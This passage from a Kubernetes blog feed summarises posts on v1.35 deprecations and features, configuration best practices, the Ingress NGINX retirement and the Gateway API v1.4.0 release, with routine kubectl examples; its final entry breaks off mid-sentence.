      "published": "Wed, 26 Nov 2025 00:00:00 +0000",
      "summary": "<p>As the release of Kubernetes v1.35 approaches, the Kubernetes project continues to evolve. Features may be deprecated, removed, or replaced to improve the project's overall health. This blog post outlines planned changes for the v1.35 release that the release team believes you should be aware of to ensure the continued smooth operation of your Kubernetes cluster(s), and to keep you up to date with the latest developments. The information below is based on the current status of the v1.35 release and is subject to change before the final release date.</p>\n<h2 id=\"deprecations-and-removals-for-kubernetes-v1-35\">Deprecations and removals for Kubernetes v1.35</h2>\n<h3 id=\"cgroup-v1-support\">cgroup v1 support</h3>\n<p>On Linux nodes, container runtimes typically rely on cgroups (short for &quot;control groups&quot;).\nSupport for using cgroup v2 has been stable in Kubernetes since v1.25, providing an alternative to the original v1 cgroup support. While cgroup v1 provided the initial resource control mechanism, it suffered from well-known\ninconsistencies and limitations. Adding support for cgroup v2 allowed use of a unified control group hierarchy, improved resource isolation, and served as the foundation for modern features, making legacy cgroup v1 support ready for removal.\nThe removal of cgroup v1 support will only impact cluster administrators running nodes on older Linux distributions that do not support cgroup v2; on those nodes, the <code>kubelet</code> will fail to start. Administrators must migrate their nodes to systems with cgroup v2 enabled. More details on compatibility requirements will be available in a blog post soon after the v1.35 release.</p>\n<p>To learn more, read <a href=\"https://kubernetes.io/docs/concepts/architecture/cgroups/\">about cgroup v2</a>;<br />\nyou can also track the switchover work via <a href=\"https://kep.k8s.io/5573\">KEP-5573: Remove cgroup v1 support</a>.</p>\n<h3 id=\"deprecation-of-ipvs-mode-in-kube-proxy\">Deprecation of ipvs mode in kube-proxy</h3>\n<p>Many releases ago, the Kubernetes project implemented an <a href=\"https://kubernetes.io/docs/reference/networking/virtual-ips/#proxy-mode-ipvs\">ipvs</a> mode in <code>kube-proxy</code>. It was adopted as a way to provide high-performance service load balancing, with better performance than the existing <code>iptables</code> mode. However, maintaining feature parity between ipvs and other kube-proxy modes became difficult, due to technical complexity and diverging requirements. This created significant technical debt and made the ipvs backend impractical to support alongside newer networking capabilities.</p>\n<p>The Kubernetes project intends to deprecate kube-proxy <code>ipvs</code> mode in the v1.35 release, to streamline the <code>kube-proxy</code> codebase. For Linux nodes, the recommended <code>kube-proxy</code> mode is already <a href=\"https://kubernetes.io/docs/reference/networking/virtual-ips/#proxy-mode-nftables\">nftables</a>.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/5495\">KEP-5495: Deprecate ipvs mode in kube-proxy</a></p>\n<h3 id=\"kubernetes-is-deprecating-containerd-v1-y-support\">Kubernetes is deprecating containerd v1.y support</h3>\n<p>While Kubernetes v1.35 still supports containerd 1.7 and other LTS releases of containerd, as a consequence of automated cgroup driver detection, the Kubernetes SIG Node community has formally agreed upon a final support timeline for containerd v1.X. Kubernetes v1.35 is the last release to offer this support (aligned with containerd 1.7 EOL).</p>\n<p>This is a final warning that if you are using containerd 1.X, you must switch to 2.0 or later before upgrading Kubernetes to the next version. You are able to monitor the <code>kubelet_cri_losing_support</code> metric to determine if any nodes in your cluster are using a containerd version that will soon be unsupported.</p>\n<p>You can find more in the <a href=\"https://kubernetes.io/blog/2025/09/12/kubernetes-v1-34-cri-cgroup-driver-lookup-now-ga/#announcement-kubernetes-is-deprecating-containerd-v1-y-support\">official blog post</a> or in <a href=\"https://kep.k8s.io/4033\">KEP-4033: Discover cgroup driver from CRI</a></p>\n<h2 id=\"featured-enhancements-of-kubernetes-v1-35\">Featured enhancements of Kubernetes v1.35</h2>\n<p>The following enhancements are some of those likely to be included in the v1.35 release. This is not a commitment, and the release content is subject to change.</p>\n<h3 id=\"node-declared-features\">Node declared features</h3>\n<p>When scheduling Pods, Kubernetes uses node labels, taints, and tolerations to match workload requirements with node capabilities. However, managing feature compatibility becomes challenging during cluster upgrades due to version skew between the control plane and nodes. This can lead to Pods being scheduled on nodes that lack required features, resulting in runtime failures.</p>\n<p>The <em>node declared features</em> framework will introduce a standard mechanism for nodes to declare their supported Kubernetes features. With the new alpha feature enabled, a Node reports the features it can support, publishing this information to the control plane through a new <code>.status.declaredFeatures</code> field. Then, the <code>kube-scheduler</code>, admission controllers and third-party components can use these declarations. For example, you can enforce scheduling and API validation constraints, ensuring that Pods run only on compatible nodes.</p>\n<p>This approach reduces manual node labeling, improves scheduling accuracy, and prevents incompatible pod placements proactively. It also integrates with the Cluster Autoscaler for informed scale-up decisions. Feature declarations are temporary and tied to Kubernetes feature gates, enabling safe rollout and cleanup.</p>\n<p>Targeting alpha in v1.35, <em>node declared features</em> aims to solve version skew scheduling issues by making node capabilities explicit, enhancing reliability and cluster stability in heterogeneous version environments.</p>\n<p>To learn more about this before the official documentation is published, you can read <a href=\"https://kep.k8s.io/5328\">KEP-5328</a>.</p>\n<h3 id=\"in-place-update-of-pod-resources\">In-place update of Pod resources</h3>\n<p>Kubernetes is graduating in-place updates for Pod resources to General Availability (GA). This feature allows users to adjust <code>cpu</code> and <code>memory</code> resources without restarting Pods or Containers. Previously, such modifications required recreating Pods, which could disrupt workloads, particularly for stateful or batch applications.\nPrevious Kubernetes releases already allowed you to change infrastructure resources settings (requests and limits) for existing Pods. This allows for smoother <a href=\"https://kubernetes.io/docs/concepts/workloads/autoscaling/vertical-pod-autoscale/\">vertical scaling</a>, improves efficiency, and can also simplify solution development.</p>\n<p>The Container Runtime Interface (CRI) has also been improved, extending the <code>UpdateContainerResources</code> API for Windows and future runtimes while allowing <code>ContainerStatus</code> to report real-time resource configurations. Together, these changes make scaling in Kubernetes faster, more flexible, and disruption-free.\nThe feature was introduced as alpha in v1.27, graduated to beta in v1.33, and is targeting graduation to stable in v1.35.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/1287\">KEP-1287: In-place Update of Pod Resources</a></p>\n<h3 id=\"pod-certificates\">Pod certificates</h3>\n<p>When running microservices, Pods often require a strong cryptographic identity to authenticate with each other using mutual TLS (mTLS). While Kubernetes provides Service Account tokens, these are designed for authenticating to the API server, not for general-purpose workload identity.</p>\n<p>Before this enhancement, operators had to rely on complex, external projects like SPIFFE/SPIRE or cert-manager to provision and rotate certificates for their workloads. But what if you could issue a unique, short-lived certificate to your Pods natively and automatically? KEP-4317 is designed to enable such native workload identity. It opens up various possibilities for securing pod-to-pod communication by allowing the <code>kubelet</code> to request and mount certificates for a Pod via a projected volume.</p>\n<p>This provides a built-in mechanism for workload identity, complete with automated certificate rotation, significantly simplifying the setup of service meshes and other zero-trust network policies. This feature was introduced as alpha in v1.34 and is targeting beta in v1.35.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/4317\">KEP-4317: Pod Certificates</a></p>\n<h3 id=\"numeric-values-for-taints\">Numeric values for taints</h3>\n<p>Kubernetes is enhancing <a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/\">taints and tolerations</a> by adding numeric comparison operators, such as <code>Gt</code> (Greater Than) and <code>Lt</code> (Less Than).</p>\n<p>Previously, tolerations supported only exact (<code>Equal</code>) or existence (<code>Exists</code>) matches, which were not suitable for numeric properties such as reliability SLAs.</p>\n<p>With this change, a Pod can use a toleration to &quot;opt-in&quot; to nodes that meet a specific numeric threshold. For example, a Pod can require a Node with an SLA taint value greater than 950 (<code>operator: Gt</code>, <code>value: &quot;950&quot;</code>).</p>\n<p>This approach is more powerful than Node Affinity because it supports the NoExecute effect, allowing Pods to be automatically evicted if a node's numeric value drops below the tolerated threshold.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/5471\">KEP-5471: Enable SLA-based Scheduling</a></p>\n<h3 id=\"user-namespaces\">User namespaces</h3>\n<p>When running Pods, you can use <code>securityContext</code> to drop privileges, but containers inside the pod often still run as root (UID 0). This simplicity poses a significant challenge, as that container UID 0 maps directly to the host's root user.</p>\n<p>Before this enhancement, a container breakout vulnerability could grant an attacker full root access to the node. But what if you could dynamically remap the container's root user to a safe, unprivileged user on the host? KEP-127 specifically allows such native support for Linux User Namespaces. It opens up various possibilities for pod security by isolating container and host user/group IDs. This allows a process to have root privileges (UID 0) within its namespace, while running as a non-privileged, high-numbered UID on the host.</p>\n<p>Released as alpha in v1.25 and beta in v1.30, this feature continues to progress through beta maturity, paving the way for truly &quot;rootless&quot; containers that drastically reduce the attack surface for a whole class of security vulnerabilities.</p>\n<p>You can find more in <a href=\"https://kep.k8s.io/127\">KEP-127: User Namespaces</a></p>\n<h3 id=\"support-for-mounting-oci-images-as-volumes\">Support for mounting OCI images as volumes</h3>\n<p>When provisioning a Pod, you often need to bundle data, binaries, or configuration files for your containers.\nBefore this enhancement, people often included that kind of data directly into the main container image, or required a custom init container to download and unpack files into an <code>emptyDir</code>. You can still take either of those approaches, of course.</p>\n<p>But what if you could populate a volume directly from a data-only artifact in an OCI registry, just like pulling a container image? Kubernetes v1.31 added support for the <code>image</code> volume type, allowing Pods to pull and unpack OCI container image artifacts into a volume declaratively.</p>\n<p>This allows for seamless distribution of data, binaries, or ML models using standard registry tooling, completely decoupling data from the container image and eliminating the need for complex init containers or startup scripts.\nThis volume type has been in beta since v1.33 and will likely be enabled by default in v1.35.</p>\n<p>You can try out the beta version of <a href=\"https://kubernetes.io/docs/concepts/storage/volumes/#image\"><code>image</code> volumes</a>, or you can learn more about the plans from <a href=\"https://kep.k8s.io/4639\">KEP-4639: OCI Volume Source</a>.</p>\n<h2 id=\"want-to-know-more\">Want to know more?</h2>\n<p>New features and deprecations are also announced in the Kubernetes release notes.

      "summary": "<p>Configuration is one of those things in Kubernetes that seems small until it's not. Configuration is at the heart of every Kubernetes workload.\nA missing quote, a wrong API version or a misplaced YAML indent can ruin your entire deploy.</p>\n<p>This blog brings together tried-and-tested configuration best practices. The small habits that make your Kubernetes setup clean, consistent and easier to manage.\nWhether you are just starting out or already deploying apps daily, these are the little things that keep your cluster stable and your future self sane.</p>\n<p><em>This blog is inspired by the original <em>Configuration Best Practices</em> page, which has evolved through contributions from many members of the Kubernetes community.</em></p>\n<h2 id=\"general-configuration-practices\">General configuration practices</h2>\n<h3 id=\"use-the-latest-stable-api-version\">Use the latest stable API version</h3>\n<p>Kubernetes evolves fast. Older APIs eventually get deprecated and stop working. So, whenever you are defining resources, make sure you are using the latest stable API version.\nYou can always check with</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl api-resources\n</span></span></code></pre></div><p>This simple step saves you from future compatibility issues.</p>\n<h3 id=\"store-configuration-in-version-control\">Store configuration in version control</h3>\n<p>Never apply manifest files directly from your desktop. Always keep them in a version control system like Git, it's your safety net.\nIf something breaks, you can instantly roll back to a previous commit, compare changes or recreate your cluster setup without panic.</p>\n<h3 id=\"write-configs-in-yaml-not-json\">Write configs in YAML not JSON</h3>\n<p>Write your configuration files using YAML rather than JSON. Both work technically, but YAML is just easier for humans. It's cleaner to read and less noisy and widely used in the community.</p>\n<p>YAML has some sneaky gotchas with boolean values:\nUse only <code>true</code> or <code>false</code>.\nDon't write <code>yes</code>, <code>no</code>, <code>on</code> or <code>off</code>.\nThey might work in one version of YAML but break in another. To be safe, quote anything that looks like a Boolean (for example <code>&quot;yes&quot;</code>).</p>\n<h3 id=\"keep-configuration-simple-and-minimal\">Keep configuration simple and minimal</h3>\n<p>Avoid setting default values that are already handled by Kubernetes. Minimal manifests are easier to debug, cleaner to review and less likely to break things later.</p>\n<h3 id=\"group-related-objects-together\">Group related objects together</h3>\n<p>If your Deployment, Service and ConfigMap all belong to one app, put them in a single manifest file.<br />\nIt's easier to track changes and apply them as a unit.\nSee the <a href=\"https://github.com/kubernetes/examples/blob/master/web/guestbook/all-in-one/guestbook-all-in-one.yaml\">Guestbook all-in-one.yaml</a> file for an example of this syntax.</p>\n<p>You can even apply entire directories with:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl apply -f configs/\n</span></span></code></pre></div><p>One command and boom everything in that folder gets deployed.</p>\n<h3 id=\"add-helpful-annotations\">Add helpful annotations</h3>\n<p>Manifest files are not just for machines, they are for humans too. Use annotations to describe why something exists or what it does. A quick one-liner can save hours when debugging later and also allows better collaboration.</p>\n<p>The most helpful annotation to set is <code>kubernetes.io/description</code>. It's like using comment, except that it gets copied into the API so that everyone else can see it even after you deploy.</p>\n<h2 id=\"managing-workloads-pods-deployments-and-jobs\">Managing Workloads: Pods, Deployments, and Jobs</h2>\n<p>A common early mistake in Kubernetes is creating Pods directly. Pods work, but they don't reschedule themselves if something goes wrong.</p>\n<p><em>Naked Pods</em> (Pods not managed by a controller, such as <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/deployment/\">Deployment</a> or a <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/\">StatefulSet</a>) are fine for testing, but in real setups, they are risky.</p>\n<p>Why?\nBecause if the node hosting that Pod dies, the Pod dies with it and Kubernetes won't bring it back automatically.</p>\n<h3 id=\"use-deployments-for-apps-that-should-always-be-running\">Use Deployments for apps that should always be running</h3>\n<p>A Deployment, which both creates a ReplicaSet to ensure that the desired number of Pods is always available, and specifies a strategy to replace Pods (such as <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#rolling-update-deployment\">RollingUpdate</a>), is almost always preferable to creating Pods directly.\nYou can roll out a new version, and if something breaks, roll back instantly.</p>\n<h3 id=\"use-jobs-for-tasks-that-should-finish\">Use Jobs for tasks that should finish</h3>\n<p>A <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\">Job</a> is perfect when you need something to run once and then stop like database migration or batch processing task.\nIt will retry if the pods fails and report success when it's done.</p>\n<h2 id=\"service-configuration-and-networking\">Service Configuration and Networking</h2>\n<p>Services are how your workloads talk to each other inside (and sometimes outside) your cluster. Without them, your pods exist but can't reach anyone. Let's make sure that doesn't happen.</p>\n<h3 id=\"create-services-before-workloads-that-use-them\">Create Services before workloads that use them</h3>\n<p>When Kubernetes starts a Pod, it automatically injects environment variables for existing Services.\nSo, if a Pod depends on a Service, create a <a href=\"https://kubernetes.io/docs/concepts/services-networking/service/\">Service</a> <strong>before</strong> its corresponding backend workloads (Deployments or StatefulSets), and before any workloads that need to access it.</p>\n<p>For example, if a Service named foo exists, all containers will get the following variables in their initial environment:</p>\n<pre tabindex=\"0\"><code>FOO_SERVICE_HOST=&lt;the host the Service runs on&gt;\nFOO_SERVICE_PORT=&lt;the port the Service runs on&gt;\n</code></pre><p>DNS based discovery doesn't have this problem, but it's a good habit to follow anyway.</p>\n<h3 id=\"use-dns-for-service-discovery\">Use DNS for Service discovery</h3>\n<p>If your cluster has the DNS <a href=\"https://kubernetes.io/docs/concepts/cluster-administration/addons/\">add-on</a> (most do), every Service automatically gets a DNS entry. That means you can access it by name instead of IP:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>curl http://my-service.default.svc.cluster.local\n</span></span></code></pre></div><p>It's one of those features that makes Kubernetes networking feel magical.</p>\n<h3 id=\"avoid-hostport-and-hostnetwork-unless-absolutely-necessary\">Avoid <code>hostPort</code> and <code>hostNetwork</code> unless absolutely necessary</h3>\n<p>You'll sometimes see these options in manifests:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">hostPort</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #666;\">8080</span><span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"></span><span style=\"color: #008000; font-weight: bold;\">hostNetwork</span>:<span style=\"color: #bbb;\"> </span><span style=\"color: #a2f; font-weight: bold;\">true</span><span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><p>But here's the thing:\nThey tie your Pods to specific nodes, making them harder to schedule and scale. Because each &lt;<code>hostIP</code>, <code>hostPort</code>, <code>protocol</code>&gt; combination must be unique. If you don't specify the <code>hostIP</code> and <code>protocol</code> explicitly, Kubernetes will use <code>0.0.0.0</code> as the default <code>hostIP</code> and <code>TCP</code> as the default <code>protocol</code>.\nUnless you're debugging or building something like a network plugin, avoid them.</p>\n<p>If you just need local access for testing, try <a href=\"https://kubernetes.io/docs/reference/kubectl/generated/kubectl_port-forward/\"><code>kubectl port-forward</code></a>:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl port-forward deployment/web 8080:80\n</span></span></code></pre></div><p>See <a href=\"https://kubernetes.io/docs/tasks/access-application-cluster/port-forward-access-application-cluster/\">Use Port Forwarding to access applications in a cluster</a> to learn more.\nOr if you really need external access, use a <a href=\"https://kubernetes.io/docs/concepts/services-networking/service/#type-nodeport\"><code>type: NodePort</code> Service</a>. That's the safer, Kubernetes-native way.</p>\n<h3 id=\"use-headless-services-for-internal-discovery\">Use headless Services for internal discovery</h3>\n<p>Sometimes, you don't want Kubernetes to load balance traffic. You want to talk directly to each Pod. That's where <a href=\"https://kubernetes.io/docs/concepts/services-networking/service/#headless-services\">headless Services</a> come in.</p>\n<p>You create one by setting <code>clusterIP: None</code>.\nInstead of a single IP, DNS gives you a list of all Pods IPs, perfect for apps that manage connections themselves.</p>\n<h2 id=\"working-with-labels-effectively\">Working with labels effectively</h2>\n<p><a href=\"https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/\">Labels</a> are key/value pairs that are attached to objects such as Pods.\nLabels help you organize, query and group your resources.\nThey don't do anything by themselves, but they make everything else from Services to Deployments work together smoothly.</p>\n<h3 id=\"use-semantics-labels\">Use semantics labels</h3>\n<p>Good labels help you understand what's what, even after months later.\nDefine and use <a href=\"https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/\">labels</a> that identify semantic attributes of your application or Deployment.\nFor example;</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000; font-weight: bold;\">labels</span>:<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">app.kubernetes.io/name</span>:<span style=\"color: #bbb;\"> </span>myapp<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">app.kubernetes.io/component</span>:<span style=\"color: #bbb;\"> </span>web<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">tier</span>:<span style=\"color: #bbb;\"> </span>frontend<span style=\"color: #bbb;\">\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #bbb;\"> </span><span style=\"color: #008000; font-weight: bold;\">phase</span>:<span style=\"color: #bbb;\"> </span>test<span style=\"color: #bbb;\">\n</span></span></span></code></pre></div><ul>\n<li><code>app.kubernetes.io/name</code> : what the app is</li>\n<li><code>tier</code> : which layer it belongs to (frontend/backend)</li>\n<li><code>phase</code> : which stage it's in (test/prod)</li>\n</ul>\n<p>You can then use these labels to make powerful selectors.\nFor example:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl get pods -l <span style=\"color: #b8860b;\">tier</span><span style=\"color: #666;\">=</span>frontend\n</span></span></code></pre></div><p>This will list all frontend Pods across your cluster, no matter which Deployment they came from.\nBasically you are not manually listing Pod names; you are just describing what you want.\nSee the <a href=\"https://github.com/kubernetes/examples/tree/master/web/guestbook/\">guestbook</a> app for examples of this approach.</p>\n<h3 id=\"use-common-kubernetes-labels\">Use common Kubernetes labels</h3>\n<p>Kubernetes actually recommends a set of <a href=\"https://kubernetes.io/docs/concepts/overview/working-with-objects/common-labels/\">common labels</a>. It's a standardized way to name things across your different workloads or projects.\nFollowing this convention makes your manifests cleaner, and it means that tools such as <a href=\"https://headlamp.dev/\">Headlamp</a>, <a href=\"https://github.com/kubernetes/dashboard#introduction\">dashboard</a>, or third-party monitoring systems can all\nautomatically understand what's running.</p>\n<h3 id=\"manipulate-labels-for-debugging\">Manipulate labels for debugging</h3>\n<p>Since controllers (like ReplicaSets or Deployments) use labels to manage Pods, you can remove a label to “detach” a Pod temporarily.</p>\n<p>Example:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl label pod mypod app-\n</span></span></code></pre></div><p>The <code>app-</code> part removes the label key <code>app</code>.\nOnce that happens, the controller won’t manage that Pod anymore.\nIt’s like isolating it for inspection, a “quarantine mode” for debugging. To interactively remove or add labels, use <a href=\"https://kubernetes.io/docs/reference/kubectl/generated/kubectl_label/\"><code>kubectl label</code></a>.</p>\n<p>You can then check logs, exec into it and once done, delete it manually.\nThat’s a super underrated trick every Kubernetes engineer should know.</p>\n<h2 id=\"handy-kubectl-tips\">Handy kubectl tips</h2>\n<p>These small tips make life much easier when you are working with multiple manifest files or clusters.</p>\n<h3 id=\"apply-entire-directories\">Apply entire directories</h3>\n<p>Instead of applying one file at a time, apply the whole folder:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span><span style=\"color: #080; font-style: italic;\"># Using server-side apply is also a good practice</span>\n</span></span><span style=\"display: flex;\"><span>kubectl apply -f configs/ --server-side\n</span></span></code></pre></div><p>This command looks for <code>.yaml</code>, <code>.yml</code> and <code>.json</code> files in that folder and applies them all together.\nIt's faster, cleaner and helps keep things grouped by app.</p>\n<h3 id=\"use-label-selectors-to-get-or-delete-resources\">Use label selectors to get or delete resources</h3>\n<p>You don't always need to type out resource names one by one.\nInstead, use <a href=\"https://kubernetes.io/docs/concepts/overview/working-with-objects/labels/#label-selectors\">selectors</a> to act on entire groups at once:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl get pods -l <span style=\"color: #b8860b;\">app</span><span style=\"color: #666;\">=</span>myapp\n</span></span><span style=\"display: flex;\"><span>kubectl delete pod -l <span style=\"color: #b8860b;\">phase</span><span style=\"color: #666;\">=</span><span style=\"color: #a2f;\">test</span>\n</span></span></code></pre></div><p>It's especially useful in CI/CD pipelines, where you want to clean up test resources dynamically.</p>\n<h3 id=\"quickly-create-deployments-and-services\">Quickly create Deployments and Services</h3>\n<p>For quick experiments, you don't always need to write a manifest. You can spin up a Deployment right from the CLI:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl create deployment webapp --image<span style=\"color: #666;\">=</span>nginx\n</span></span></code></pre></div><p>Then expose it as a Service:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>kubectl expose deployment webapp --port<span style=\"color: #666;\">=</span><span style=\"color: #666;\">80</span>\n</span></span></code></pre></div><p>This is great when you just want to test something before writing full manifests.\nAlso, see <a href=\"https://kubernetes.io/docs/tasks/access-application-cluster/service-access-application-cluster/\">Use a Service to Access an Application in a cluster</a> for an example.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Cleaner configuration leads to calmer cluster administrators.\nIf you stick to a few simple habits: keep configuration simple and minimal, version-control everything,\nuse consistent labels, and avoid relying on naked Pods, you'll save yourself hours of debugging down the road.</p>\n<p>The best part?\nClean configurations stay readable. Even after months, you or anyone on your team can glance at them and know exactly what’s happening.</p>",

      "summary": "<p>To prioritize the safety and security of the ecosystem, Kubernetes SIG Network and the Security Response Committee are announcing the upcoming retirement of <a href=\"https://github.com/kubernetes/ingress-nginx/\">Ingress NGINX</a>. Best-effort maintenance will continue until March 2026. Afterward, there will be no further releases, no bugfixes, and no updates to resolve any security vulnerabilities that may be discovered. <strong>Existing deployments of Ingress NGINX will continue to function and installation artifacts will remain available.</strong></p>\n<p>We recommend migrating to one of the many alternatives. Consider <a href=\"https://gateway-api.sigs.k8s.io/guides/\">migrating to Gateway API</a>, the modern replacement for Ingress. If you must continue using Ingress, many alternative Ingress controllers are <a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/\">listed in the Kubernetes documentation</a>. Continue reading for further information about the history and current state of Ingress NGINX, as well as next steps.</p>\n<h2 id=\"about-ingress-nginx\">About Ingress NGINX</h2>\n<p><a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress/\">Ingress</a> is the original user-friendly way to direct network traffic to workloads running on Kubernetes. (<a href=\"https://kubernetes.io/docs/concepts/services-networking/gateway/\">Gateway API</a> is a newer way to achieve many of the same goals.) In order for an Ingress to work in your cluster, there must be an <a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/\">Ingress controller</a> running. There are many Ingress controller choices available, which serve the needs of different users and use cases. Some are cloud-provider specific, while others have more general applicability.</p>\n<p><a href=\"https://www.github.com/kubernetes/ingress-nginx\">Ingress NGINX</a> was an Ingress controller, developed early in the history of the Kubernetes project as an example implementation of the API. It became very popular due to its tremendous flexibility, breadth of features, and independence from any particular cloud or infrastructure provider. Since those days, many other Ingress controllers have been created within the Kubernetes project by community groups, and by cloud native vendors. Ingress NGINX has continued to be one of the most popular, deployed as part of many hosted Kubernetes platforms and within innumerable independent users’ clusters.</p>\n<h2 id=\"history-and-challenges\">History and Challenges</h2>\n<p>The breadth and flexibility of Ingress NGINX has caused maintenance challenges. Changing expectations about cloud native software have also added complications. What were once considered helpful options have sometimes come to be considered serious security flaws, such as the ability to add arbitrary NGINX configuration directives via the &quot;snippets&quot; annotations. Yesterday’s flexibility has become today’s insurmountable technical debt.</p>\n<p>Despite the project’s popularity among users, Ingress NGINX has always struggled with insufficient or barely-sufficient maintainership. For years, the project has had only one or two people doing development work, on their own time, after work hours and on weekends. Last year, the Ingress NGINX maintainers <a href=\"https://kccncna2024.sched.com/event/1hoxW/securing-the-future-of-ingress-nginx-james-strong-isovalent-marco-ebert-giant-swarm\">announced</a> their plans to wind down Ingress NGINX and develop a replacement controller together with the Gateway API community. Unfortunately, even that announcement failed to generate additional interest in helping maintain Ingress NGINX or develop InGate to replace it. (InGate development never progressed far enough to create a mature replacement; it will also be retired.)</p>\n<h2 id=\"current-state-and-next-steps\">Current State and Next Steps</h2>\n<p>Currently, Ingress NGINX is receiving best-effort maintenance. SIG Network and the Security Response Committee have exhausted our efforts to find additional support to make Ingress NGINX sustainable. To prioritize user safety, we must retire the project.</p>\n<p>In March 2026, Ingress NGINX maintenance will be halted, and the project will be <a href=\"https://github.com/kubernetes-retired/\">retired</a>. After that time, there will be no further releases, no bugfixes, and no updates to resolve any security vulnerabilities that may be discovered. The GitHub repositories will be made read-only and left available for reference.</p>\n<p>Existing deployments of Ingress NGINX will not be broken. Existing project artifacts such as Helm charts and container images will remain available.</p>\n<p>In most cases, you can check whether you use Ingress NGINX by running <code>kubectl get pods \\--all-namespaces \\--selector app.kubernetes.io/name=ingress-nginx</code> with cluster administrator permissions.</p>\n<p>We would like to thank the Ingress NGINX maintainers for their work in creating and maintaining this project–their dedication remains impressive. This Ingress controller has powered billions of requests in datacenters and homelabs all around the world. In a lot of ways, Kubernetes wouldn’t be where it is without Ingress NGINX, and we are grateful for so many years of incredible effort.</p>\n<p><strong>SIG Network and the Security Response Committee recommend that all Ingress NGINX users begin migration to Gateway API or another Ingress controller immediately.</strong> Many options are listed in the Kubernetes documentation: <a href=\"https://gateway-api.sigs.k8s.io/guides/\">Gateway API</a>, <a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/\">Ingress</a>. Additional options may be available from vendors you work with.</p>",

The Kubernetes SIG Network community presented the General Availability (GA) release of Gateway API (v1.4.0)! Released on October 6, 2025, version 1.4.0 reinforces the path for modern, expressive, and extensible service networking in Kubernetes.</p>\n<p>Gateway API v1.4.0 brings three new features to the <em>Standard channel</em>\n(Gateway API's GA release channel):</p>\n<ul>\n<li><strong>BackendTLSPolicy for TLS between gateways and backends</strong></li>\n<li><strong><code>supportedFeatures</code> in GatewayClass status</strong></li>\n<li><strong>Named rules for Routes</strong></li>\n</ul>\n<p>and introduces three new experimental features:</p>\n<ul>\n<li><strong>Mesh resource for service mesh configuration</strong></li>\n<li><strong>Default gateways</strong> to ease configuration burden**</li>\n<li><strong><code>externalAuth</code> filter for HTTPRoute</strong></li>\n</ul>\n<h2 id=\"graduations-to-standard-channel\">Graduations to Standard Channel</h2>\n<h3 id=\"backend-tls-policy\">Backend TLS policy</h3>\n<p>Leads: <a href=\"https://github.com/candita\">Candace Holman</a>, <a href=\"https://github.com/snorwin\">Norwin Schnyder</a>, <a href=\"https://github.com/kl52752\">Katarzyna Łach</a></p>\n<p>GEP-1897: <a href=\"https://github.com/kubernetes-sigs/gateway-api/issues/1897\">BackendTLSPolicy</a></p>\n<p><a href=\"https://gateway-api.sigs.k8s.io/api-types/backendtlspolicy\">BackendTLSPolicy</a> is a new Gateway API type for specifying the TLS configuration\nof the connection from the Gateway to backend pod(s).\n. Prior to the introduction of BackendTLSPolicy, there was no API specification\nthat allowed encrypted traffic on the hop from Gateway to backend.</p>\n<p>The <code>BackendTLSPolicy</code> <code>validation</code> configuration requires a hostname. This <code>hostname</code>\nserves two purposes. It is used as the SNI header when connecting to the backend and\nfor authentication, the certificate presented by the backend must match this hostname,\n<em>unless</em> <code>subjectAltNames</code> is explicitly specified.</p>\n<p>If <code>subjectAltNames</code> (SANs) are specified, the <code>hostname</code> is only used for SNI, and authentication is performed against the SANs instead. If you still need to authenticate against the hostname value in this case, you MUST add it to the <code>subjectAltNames</code> list.</p>\n<p>BackendTLSPolicy <code>validation</code> configuration also requires either <code>caCertificateRefs</code> or <code>wellKnownCACertificates</code>.\n<code>caCertificateRefs</code> refer to one or more (up to 8) PEM-encoded TLS certificate bundles. If there are no specific certificates to use,\nthen depending on your implementation, you may use 